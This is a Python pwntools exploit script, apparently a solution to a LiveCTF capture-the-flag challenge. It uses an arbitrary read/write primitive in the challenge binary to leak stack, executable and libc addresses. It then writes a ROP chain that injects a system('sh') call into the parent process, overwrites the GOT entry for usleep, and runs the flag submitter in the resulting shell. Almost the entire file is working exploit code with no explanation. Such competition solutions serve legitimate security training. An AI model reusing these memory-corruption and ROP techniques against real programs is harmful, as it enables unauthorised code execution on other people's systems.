#!/usr/bin/env python3
from pwn import *

context.log_level = "error"
import sys

split = lambda v, sz: [v[i : i + sz] for i in range(0, len(v), sz)]
uu64 = lambda x: u64(x.ljust(8, b"\0")[:8])

HOST = os.environ.get("HOST", "localhost")
PORT = 31337

exe = context.binary = ELF("./handout/challenge", checksec=False)
libc = ELF("./handout/libc.so.6", checksec=False)

if args.LOCAL:
    io = process(exe.path)
    pause()
else:
    io = remote(HOST, PORT)
    #  print = lambda *a, **kw: None

PROMPT = b": \n"


def send(s, endl=False, recv=True):
    if type(s) != bytes:
        if type(s) != str:
            s = f"{s}\n"
        s = s.encode()
    if endl and s[-1] != ord("\n"):
        s += b"\n"
    if PROMPT and recv:
        io.recvuntil(PROMPT)
    io.send(s)


def read(addr):
    send(1)
    send(hex(addr), endl=True)
    io.recvuntil(b"Value: ")
    leak = io.recvline()
    return int(leak, 16)


def write(addr, value):
    #  print("write", hex(addr), hex(value))
    send(2)
    send(hex(value), endl=True)
    send(hex(addr), endl=True)


stack_environ = read(0)
print(f"{stack_environ = :0x}")
exe.address = read(stack_environ - 0x20) - 0x1285
print(f"{exe.address = :0x}")
libc.address = read(stack_environ - 0x110) - 0x29D90
print(f"{libc.address = :0x}")

stack_ret = stack_environ - 0x110
print(f"{stack_ret = :0x}")

# 0x0000000000029139: ret;
ret = libc.address + 0x0000000000029139
# 0x000000000014a1b5: xchg edi, eax; ret;
xchg_edi_eax = libc.address + 0x000000000014A1B5
# 0x000000000002a3e5: pop rdi; ret;
pop_rdi = libc.address + 0x000000000002A3E5
# 0x000000000002be51: pop rsi; ret;
pop_rsi = libc.address + 0x000000000002BE51
# 0x00000000000904a9: pop rdx; pop rbx; ret;
pop_rdx_rbx = libc.address + 0x00000000000904A9
# 0x00000000000a0ca3: lea rdx, [rax + 1]; mov qword ptr [rip + 0x17971a], rdx; ret;
lea_rdx = libc.address + 0x00000000000A0CA3
# 0x00000000000c45e3: sub rax, 1; ret;
dec_rax = libc.address + 0x00000000000C45E3

payload = [ret] * 10

payload += [
    libc.sym.getppid,
    xchg_edi_eax,
]

payload += [
    pop_rsi,
    stack_ret + 8 * 0,
    pop_rdx_rbx,
    pop_rdi,
    0,
    exe.sym.writev_helper,
]

payload += [
    pop_rsi,
    stack_ret + 8 * 1,
    pop_rdx_rbx,
    next(libc.search(b"sh\0")),
    0,
    exe.sym.writev_helper,
]

payload += [
    pop_rsi,
    stack_ret + 8 * 2,
    pop_rdx_rbx,
    pop_rdi,
    0,
    exe.sym.writev_helper,
]

payload += [
    pop_rsi,
    stack_ret + 8 * 3,
    pop_rdx_rbx,
    next(libc.search(b"sh\0")),
    0,
    exe.sym.writev_helper,
]

payload += [
    pop_rsi,
    stack_ret + 8 * 4,
    pop_rdx_rbx,
    ret,
    0,
    exe.sym.writev_helper,
]

payload += [
    pop_rsi,
    stack_ret + 8 * 5,
    pop_rdx_rbx,
    libc.sym.system,
    0,
    exe.sym.writev_helper,
]

payload += [
    libc.sym.getppid,
    dec_rax,
    lea_rdx,
    pop_rsi,
    stack_ret + 8 * 1,
    exe.sym.writev_helper,
]


for i, v in enumerate(payload):
    write(stack_ret + i * 8, v)

write(exe.got.usleep, exe.address + 0x14F7)

sleep(1)

send(3)

if args.LOCAL:
    io.interactive()
else:
    try:
        io.clean(1)
        io.sendline(b"./submitter")
        flag = io.recvline_contains(b"LiveCTF{", timeout=1).decode().strip()
        print(flag)
    except:
        pass
        # os.execve(sys.argv[0], sys.argv, os.environ)
